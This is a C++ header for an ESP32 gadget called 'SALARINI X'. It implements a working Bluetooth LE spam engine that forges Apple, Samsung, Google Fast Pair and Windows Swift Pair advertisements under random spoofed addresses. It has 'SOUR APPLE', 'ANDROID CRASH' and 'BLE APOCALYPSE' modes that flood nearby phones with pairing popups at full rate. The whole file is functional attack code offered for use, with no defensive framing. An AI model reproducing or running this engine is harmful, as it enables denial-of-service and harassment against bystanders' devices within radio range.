/*
  SALARINI X - BLESpammer.h
  ---------------------------------------------------------------------------
  BLE advertisement spam engine ported from the Nova X project
  (BSD-2-Clause, https://github.com/warwick320/nova-x) and extended with
  Android (Google Fast Pair) + Windows (Swift Pair) payloads and combined
  modes (sequential / random mix).

  Requires the NimBLE-Arduino library by h2zero (same requirement as Nova X).
  If the library is missing, all entry points fail gracefully with false.
  ---------------------------------------------------------------------------
*/
#pragma once

#include <Arduino.h>
#include "BLEDevices.h"
#include "AttackEngine.h"   // BLELink enum

#if __has_include(<NimBLEDevice.h>)
#define SALARINI_BLE_AVAILABLE 1
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>
#if __has_include(<NimBLEVersion.h>)
#include <NimBLEVersion.h>
#endif
#include <host/ble_hs.h>
#endif

// Build-time diagnostic: visible in the Arduino IDE output so there is never
// a doubt whether BLE support got compiled in or not.
#if SALARINI_BLE_AVAILABLE
#pragma message("SALARINI X: BLE spam ENABLED (NimBLE-Arduino detected)")
#else
#pragma message("SALARINI X: BLE spam DISABLED - NimBLE-Arduino library not detected")
#endif

namespace ble {

enum class Mode : uint8_t { OFF = 0, APPLE, SAMSUNG, ANDROID, WINDOWS, ALL_SEQ, RANDOM,
                            SOUR_APPLE, ANDROID_CRASH, APOCALYPSE };

static bool    sInitOK = false;
static bool    sInitTried = false;
static bool    sRunning = false;
static Mode    sMode = Mode::OFF;
static uint8_t sSeqIdx = 0;
static uint32_t sAdvCount = 0;
static uint32_t sLastTickMs = 0;
static uint32_t sRetryAfterMs = 0;

#if SALARINI_BLE_AVAILABLE
static NimBLEAdvertising *sAdv = nullptr;
static uint8_t sDummyAddr[6] = {0,0,0,0,0,0};

static void addrReset(){
  for(int i=0;i<6;i++) sDummyAddr[i] = (uint8_t)random(0,256);
  if((sDummyAddr[0]|sDummyAddr[1]|sDummyAddr[2]|sDummyAddr[3]|sDummyAddr[4]) == 0) sDummyAddr[0] = 0x01;
  sDummyAddr[0] |= 0xC0;   // random static address (Nova X)
}

static void pushPayload(const uint8_t* data, size_t len){
  addrReset();
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  ble_hs_id_set_rnd(sDummyAddr);
  NimBLEAdvertisementData advData;
  advData.addData(data, len);
  sAdv->setAdvertisementData(advData);
  sAdv->start();
  // V20 pressure profile: storm modes cycle as fast as the controller allows
  // (~2 ms gap, 300+ popup frames per second bursts), MAX power narrows the
  // gap for every other mode, LOW keeps the gentle spacing.
  bool storm = (sMode == Mode::SOUR_APPLE || sMode == Mode::ANDROID_CRASH || sMode == Mode::APOCALYPSE);
  if(storm)            delay(2);
  else if(ae::powerLevel() == ae::Power::PWR_MAX) delay(5);
  else if(ae::powerLevel() == ae::Power::PWR_LOW) delay(30);
  else                 delay(10);
  sAdv->stop();
  sAdvCount++;
}

// ---- payload builders -----------------------------------------------------
static bool buildApple(uint8_t* buf, size_t &len){
  if(random(0,2) == 0){
    int i = random(0, APPLE_DEVICE_COUNT);
    memcpy(buf, APPLE_DEVICES[i], 31); len = 31;
  } else {
    int i = random(0, APPLE_SHORT_COUNT);
    memcpy(buf, APPLE_SHORT_DEVICES[i], 23); len = 23;
  }
  return true;
}

static bool buildSamsung(uint8_t* buf, size_t &len){
  if(random(0,2) == 0){
    // Galaxy Buds (27-byte manufacturer AD from Nova X IDF samsung.cpp)
    uint32_t model = SAMSUNG_BUDS_MODELS[random(0, SAMSUNG_BUDS_COUNT)];
    uint8_t i = 0;
    buf[i++]=27;  buf[i++]=0xFF;  buf[i++]=0x75;  buf[i++]=0x00;
    buf[i++]=0x42; buf[i++]=0x09; buf[i++]=0x81;  buf[i++]=0x02;
    buf[i++]=0x14; buf[i++]=0x15; buf[i++]=0x03;  buf[i++]=0x21;
    buf[i++]=0x01; buf[i++]=0x09;
    buf[i++]=(model >> 16) & 0xFF;
    buf[i++]=(model >>  8) & 0xFF;
    buf[i++]=0x01;
    buf[i++]= model & 0xFF;
    buf[i++]=0x06; buf[i++]=0x3C; buf[i++]=0x94;  buf[i++]=0x8E;
    buf[i++]=0x00; buf[i++]=0x00; buf[i++]=0x00;  buf[i++]=0x00;
    buf[i++]=0xC7; buf[i++]=0x00;
    len = i;
  } else {
    // Galaxy Watch (15-byte manufacturer AD from Nova X bt.cpp samsungAdv)
    uint8_t model = SAMSUNG_WATCH_MODELS[random(0, SAMSUNG_WATCH_COUNT)];
    uint8_t i = 0;
    buf[i++]=14;                       // AD length
    buf[i++]=0xFF;                     // Manufacturer Specific
    buf[i++]=0x75; buf[i++]=0x00;      // Samsung Electronics
    buf[i++]=0x01; buf[i++]=0x00; buf[i++]=0x02; buf[i++]=0x00;
    buf[i++]=0x01; buf[i++]=0x01; buf[i++]=0xFF;
    buf[i++]=0x00; buf[i++]=0x00; buf[i++]=0x43;
    buf[i++]= model;
    len = i;
  }
  return true;
}

static bool buildAndroid(uint8_t* buf, size_t &len){
  uint32_t model = ANDROID_MODELS[random(0, ANDROID_MODEL_COUNT)];
  uint8_t i = 0;
  buf[i++]=3;  buf[i++]=0x03;  buf[i++]=0x2C;  buf[i++]=0xFE;   // 16-bit svc: FE2C (Google)
  buf[i++]=6;  buf[i++]=0x16;  buf[i++]=0x2C;  buf[i++]=0xFE;   // svc data
  buf[i++]=(model >> 16) & 0xFF;
  buf[i++]=(model >>  8) & 0xFF;
  buf[i++]= model & 0xFF;
  buf[i++]=2;  buf[i++]=0x0A;                                   // TX power
  buf[i++]=(uint8_t)(random(0,120) - 100);
  len = i;
  return true;
}

static bool buildWindows(uint8_t* buf, size_t &len){
  uint8_t nameLen = (uint8_t)(random(0,7) + 2);
  char name[9];
  for(uint8_t n=0;n<nameLen;n++) name[n] = WINDOWS_CHARSET[random(0,(long)(sizeof(WINDOWS_CHARSET)-1))];
  uint8_t i = 0;
  buf[i++]=(uint8_t)(7 + nameLen - 1);   // AD length (type + 6 + name)
  buf[i++]=0xFF;                          // Manufacturer Specific
  buf[i++]=0x06; buf[i++]=0x00;           // Microsoft
  buf[i++]=0x03; buf[i++]=0x00; buf[i++]=0x80;
  memcpy(&buf[i], name, nameLen); i += nameLen;
  len = i;
  return true;
}

static bool sendOne(Mode m){
  uint8_t buf[32]; size_t len = 0;
  switch(m){
    case Mode::APPLE:   return buildApple(buf, len)   && (pushPayload(buf, len), true);
    case Mode::SAMSUNG: return buildSamsung(buf, len) && (pushPayload(buf, len), true);
    case Mode::ANDROID: return buildAndroid(buf, len) && (pushPayload(buf, len), true);
    case Mode::WINDOWS: return buildWindows(buf, len) && (pushPayload(buf, len), true);
    case Mode::SOUR_APPLE:
      // Full-rate stream of ONLY Apple action-modal payloads: every device
      // in range receives a new "setup request" continuously.
      {
        int i = random(0, APPLE_SHORT_COUNT);
        memcpy(buf, APPLE_SHORT_DEVICES[i], 23); len = 23;
        return (pushPayload(buf, len), true);
      }
    case Mode::ANDROID_CRASH:
      // Full-rate Google Fast Pair stream: maximum pairing dialog pressure.
      return buildAndroid(buf, len) && (pushPayload(buf, len), true);
    case Mode::ALL_SEQ: {
      Mode seq[4] = { Mode::APPLE, Mode::SAMSUNG, Mode::ANDROID, Mode::WINDOWS };
      Mode cur = seq[sSeqIdx % 4];
      sSeqIdx = (uint8_t)((sSeqIdx + 1) % 4);
      switch(cur){
        case Mode::APPLE:   return buildApple(buf, len)   && (pushPayload(buf, len), true);
        case Mode::SAMSUNG: return buildSamsung(buf, len) && (pushPayload(buf, len), true);
        case Mode::ANDROID: return buildAndroid(buf, len) && (pushPayload(buf, len), true);
        default:            return buildWindows(buf, len) && (pushPayload(buf, len), true);
      }
    }
    case Mode::RANDOM:
    case Mode::APOCALYPSE: {
      uint8_t r = (uint8_t)random(0,4);
      switch(r){
        case 0:  return buildApple(buf, len)   && (pushPayload(buf, len), true);
        case 1:  return buildSamsung(buf, len) && (pushPayload(buf, len), true);
        case 2:  return buildAndroid(buf, len) && (pushPayload(buf, len), true);
        default: return buildWindows(buf, len) && (pushPayload(buf, len), true);
      }
    }
    default: return false;
  }
}
#endif // SALARINI_BLE_AVAILABLE

const char* modeName(Mode m){
  switch(m){
    case Mode::APPLE:        return "APPLE / IOS";
    case Mode::SAMSUNG:      return "SAMSUNG";
    case Mode::ANDROID:      return "ANDROID";
    case Mode::WINDOWS:      return "WINDOWS";
    case Mode::ALL_SEQ:      return "ALL (SEQUENTIAL)";
    case Mode::RANDOM:       return "RANDOM MIX";
    case Mode::SOUR_APPLE:   return "SOUR APPLE (MAX)";
    case Mode::ANDROID_CRASH:return "ANDROID CRASH (MAX)";
    case Mode::APOCALYPSE:   return "BLE APOCALYPSE";
    default:                 return "OFF";
  }
}

bool bleLibraryAvailable(){
#if SALARINI_BLE_AVAILABLE
  return true;
#else
  return false;
#endif
}

bool ensureInit(){
#if SALARINI_BLE_AVAILABLE
  if(sInitOK) return true;
  if(sInitTried && millis() < sRetryAfterMs) return false;
  sInitTried = true;
  NimBLEDevice::init("Salarini-X");
  NimBLEDevice::setPower(ESP_PWR_LVL_P20);
  NimBLEDevice::createServer();
  sAdv = NimBLEDevice::getAdvertising();
  if(!sAdv){
    sRetryAfterMs = millis() + 3000;
    return false;
  }
  sInitOK = true;
  Serial.println("[BLE] NimBLE ready");
  return true;
#else
  return false;
#endif
}

bool start(Mode m){
  if(m == Mode::OFF) return false;
#if SALARINI_BLE_AVAILABLE
  if(!ensureInit()){
    Serial.println("[BLE] init failed - check NimBLE-Arduino library");
    return false;
  }
  sMode = m;
  sSeqIdx = 0;
  sAdvCount = 0;
  sLastTickMs = 0;
  sRunning = true;
  Serial.printf("[BLE] spam start: %s\n", modeName(m));
  return true;
#else
  (void)m;
  return false;
#endif
}

void stop(){
  if(!sRunning) return;
  sRunning = false;
  sMode = Mode::OFF;
#if SALARINI_BLE_AVAILABLE
  if(sInitOK && sAdv){ sAdv->stop(); }
#endif
  Serial.println("[BLE] spam stopped");
}

void service(){
#if SALARINI_BLE_AVAILABLE
  if(!sRunning || !sInitOK) return;
  // V20 pacing: storm modes push every loop pass; every other mode also runs
  // ungated at MAX power. The per-payload cycle itself is ~2-12 ms, so the
  // phone receives an effectively continuous popup stream.
  uint32_t gate;
  if(sMode == Mode::SOUR_APPLE || sMode == Mode::ANDROID_CRASH || sMode == Mode::APOCALYPSE){
    gate = 0;                                     // maximum rate, always
  } else {
    switch(ae::powerLevel()){
      case ae::Power::PWR_LOW: gate = 25; break;
      case ae::Power::PWR_MAX: gate = 0;  break;
      default:                 gate = 4;  break;
    }
  }
  uint32_t now = millis();
  if(gate && (now - sLastTickMs < gate)) return;
  sLastTickMs = now;
  sendOne(sMode);
#endif
}

bool active(){ return sRunning; }
Mode mode(){ return sMode; }
uint32_t advCount(){ return sAdvCount; }
const char* modeNameOfActive(){ return modeName(sMode); }

} // namespace ble

// Bridge used by the attack engine combo modes
static void bleLinkFromEngine(ae::BLELink link){
  if(link == ae::BLELink::NONE){ ble::stop(); return; }
  switch(link){
    case ae::BLELink::APPLE:   ble::start(ble::Mode::APPLE);   break;
    case ae::BLELink::SAMSUNG: ble::start(ble::Mode::SAMSUNG); break;
    case ae::BLELink::ANDROID: ble::start(ble::Mode::ANDROID); break;
    case ae::BLELink::WINDOWS: ble::start(ble::Mode::WINDOWS); break;
    case ae::BLELink::ALL_SEQ: ble::start(ble::Mode::ALL_SEQ); break;
    case ae::BLELink::RANDOM:  ble::start(ble::Mode::RANDOM);  break;
    default: break;
  }
}
